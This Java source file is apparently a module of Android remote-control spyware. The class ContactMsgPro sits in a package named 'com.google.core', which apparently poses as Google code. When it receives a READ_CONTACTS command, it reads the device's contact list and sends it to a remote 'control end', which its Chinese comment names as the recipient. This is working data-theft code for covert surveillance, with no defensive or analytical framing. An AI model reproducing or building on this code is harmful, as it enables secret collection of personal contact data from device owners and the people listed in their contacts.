package com.google.core.msgpro;

import java.util.List;

import com.alibaba.fastjson.JSONObject;
import com.google.core.dao.ContactDao;
import com.google.core.domain.ContactInfo;
import com.google.core.domain.MsgType;
import com.google.core.utils.MsgUtils;

import android.content.Context;

public class ContactMsgPro {

	private Context context;
	private ContactDao contactDao;

	public ContactMsgPro(Context context) {
		this.context=context;
		contactDao=new ContactDao(context);
	}

	public void doPro(int type, String data) {
		switch (type) {
		case MsgType.READ_CONTACTS:
			// 读取联系人列表
			List<ContactInfo> list = contactDao.getList();
//			发送给控制端
			MsgUtils.sendToAdmin(context, MsgType.CONTACTS_LIST, list);
			break;
		}
	}


}
